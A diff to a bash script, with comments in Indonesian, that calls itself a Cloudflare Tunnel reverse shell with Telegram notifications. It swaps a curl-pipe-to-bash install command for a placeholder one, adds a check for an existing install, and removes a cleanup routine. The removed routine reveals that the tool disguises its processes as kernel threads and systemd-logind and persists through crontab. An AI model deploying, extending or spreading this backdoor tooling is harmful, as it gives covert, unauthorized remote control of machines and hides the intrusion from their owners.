@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi
-# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"
-# Uninstall: CF_UNINSTALL=<token> bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"
+# Usage: bash -c "$(curl -fsSL httpa://example/dep.sh)"
+# Uninstall: CF_UNINSTALL=<token> bash -c "$(curl -fsSL https://example/dep.sh)"
 
 # ========== KONFIGURASI ==========
 : "${HOME:=/tmp}"
@@ -200,6 +200,16 @@ EOF
     fi
 }
 
+# ========== DETEKSI INSTALASI SUDAH ADA ==========
+check_existing_installation() {
+    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
+    if [[ -f "$token_file" ]]; then
+        warn "Installation already detected. If you want to reinstall, first uninstall with the token."
+        exit 1
+    fi
+    # Tidak mengecek proses karena bisa false positive dengan proses kernel asli
+}
+
 # ========== UNINSTALL (dengan token) ==========
 uninstall() {
     # Baca token yang tersimpan
@@ -240,27 +250,12 @@ uninstall() {
     exit 0
 }
 
-# ========== FORCE REMOVE OLD INSTALLATION ==========
-force_cleanup_old() {
-    warn "Menghapus instalasi lama (jika ada)..."
-    # Matikan proses palsu milik user ini
-    pkill -u "$UID" -f "\[(kworker|rcu|ksoftirqd|slub_flushwq|kcompactd|kswapd|jbd2|ext4)" 2>/dev/null || true
-    pkill -u "$UID" -f "systemd-logind" 2>/dev/null || true
-    pkill -u "$UID" -f "cf_tunnel.sh" 2>/dev/null || true
-    # Hapus crontab
-    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
-    # Hapus direktori konfigurasi
-    rm -rf "${HOME}/.${CONFIG_DIR}" 2>/dev/null || true
-    rm -rf "/tmp/.${CONFIG_DIR}-${UID}" 2>/dev/null || true
-    rm -rf "$TMPDIR" 2>/dev/null || true
-}
-
 # ========== MAIN ==========
 # Cek uninstall dengan token
 [[ -n "${CF_UNINSTALL:-}" ]] && uninstall
 
-# Jika tidak dalam mode uninstall, bersihkan instalasi lama
-force_cleanup_old
+# Cek apakah instalasi sudah ada (hanya jika tidak dalam mode uninstall)
+check_existing_installation
 
 rm -rf "$TMPDIR" 2>/dev/null || true
 mkdir -p "$TMPDIR"
